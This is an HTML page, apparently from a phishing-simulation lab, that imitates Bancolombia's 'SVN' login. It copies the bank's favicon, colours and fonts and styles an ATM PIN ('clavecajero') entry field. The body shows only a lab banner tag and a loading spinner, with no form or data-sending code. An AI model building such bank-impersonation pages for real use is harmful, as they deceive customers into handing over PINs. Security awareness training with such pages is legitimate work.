<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-store">
    <title>SVN - Bancolombia</title>
    <link rel="icon" type="image/x-icon" href="https://svnegocios.apps.bancolombia.com/favicon.ico">
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        'bc-yellow': '#FDDA24',
                        'bc-dark': '#2C2A29',
                        'bc-gray': '#58595B',
                        'bc-gray-light': '#B3B5B8',
                        'bc-light': '#F5F5F5',
                        'bc-blue': '#0033A0',
                        'bc-info': '#E8F4FD',
                        'bc-info-border': '#0D47A1',
                        'bc-border': '#CDCDCD'
                    },
                    fontFamily: {
                        'cib': ['CIBFont Sans', 'Open Sans', 'sans-serif'],
                        'open': ['Open Sans', 'sans-serif']
                    },
                    boxShadow: {
                        'card': '0 4px 16px rgba(0, 0, 0, 0.08)'
                    }
                }
            }
        }
    </script>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        @font-face {
            font-family: 'CIBFont Sans';
            src: url('/svn/fonts/CIBFontSans-Light.woff2') format('woff2');
            font-weight: 300;
            font-style: normal;
        }
        @font-face {
            font-family: 'CIBFont Sans';
            src: url('/svn/fonts/CIBFontSans-Regular.woff2') format('woff2');
            font-weight: 400;
            font-style: normal;
        }
        @font-face {
            font-family: 'CIBFont Sans';
            src: url('/svn/fonts/CIBFontSans-Bold.woff2') format('woff2');
            font-weight: 700;
            font-style: normal;
        }
    </style>
    <style>
        .bg-trazo {
            background-image: url('/svn/trazo-auth.svg');
            background-repeat: no-repeat;
            background-size: 100%;
        }
        @media (max-width: 768px) {
            .bg-trazo {
                background-size: 1025px;
            }
        }
        input[type="number"]::-webkit-outer-spin-button,
        input[type="number"]::-webkit-inner-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }
        input[type="number"] {
            -moz-appearance: textfield;
        }
        /* Card styles */
        .bc-card {
            background: white;
            border-radius: 16px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
            padding: 32px 28px;
        }
        /* Button styles */
        .bc-button-primary {
            background-color: #FDDA24;
            color: #2C2A29;
            font-family: 'Open Sans', sans-serif;
            font-weight: 600;
            font-size: 16px;
            padding: 14px 24px;
            border-radius: 100px;
            border: none;
            width: 100%;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        .bc-button-primary:hover:not(:disabled) {
            background-color: #E5C520;
        }
        .bc-button-primary:disabled {
            background-color: #E0E0E0;
            color: rgba(0,0,0,0.26);
            cursor: not-allowed;
        }
        .bc-button-secondary {
            background-color: transparent;
            color: #2C2A29;
            font-family: 'Open Sans', sans-serif;
            font-weight: 600;
            font-size: 16px;
            padding: 14px 24px;
            border-radius: 100px;
            border: 1px solid #2C2A29;
            width: 100%;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        .bc-button-secondary:hover {
            background-color: #F5F5F5;
        }
        /* Footer link styles */
        .bc-footer-link {
            font-family: 'Open Sans', sans-serif;
            font-size: 14px;
            color: #58595B;
            text-decoration: none;
            transition: color 0.2s;
        }
        .bc-footer-link:hover {
            color: #2C2A29;
            text-decoration: underline;
        }
        /* OTP Input */
        .clavecajero-container {
            display: flex;
            justify-content: center;
            gap: 8px;
        }
        .clavecajero-input {
            width: 40px;
            height: 48px;
            border: none;
            border-bottom: 2px solid #CDCDCD;
            background: transparent;
            text-align: center;
            font-family: 'Open Sans', sans-serif;
            font-size: 24px;
            font-weight: 600;
            color: #2C2A29;
            transition: border-color 0.2s;
        }
        .clavecajero-input:focus {
            outline: none;
            border-bottom-color: #FDDA24;
        }
        .clavecajero-input.filled {
            border-bottom-color: #FDDA24;
        }
        .otp-separator {
            display: flex;
            align-items: center;
            padding: 0 4px;
        }
        .otp-separator span {
            width: 8px;
            height: 2px;
            background-color: #CDCDCD;
        }
    </style>
</head>

<body class="bg-bc-light min-h-screen font-open">
    <x-lab-banner />

    <!-- Loading Spinner -->
    <div id="loading" class="fixed inset-0 bg-white/90 flex items-center justify-center z-50">
        <div class="text-center">
            <div class="w-16 h-16 border-4 border-bc-yellow border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
            <p class="text-bc-gray font-open">Cargando...</p>
        </div>
    </div>

</body>

</html>
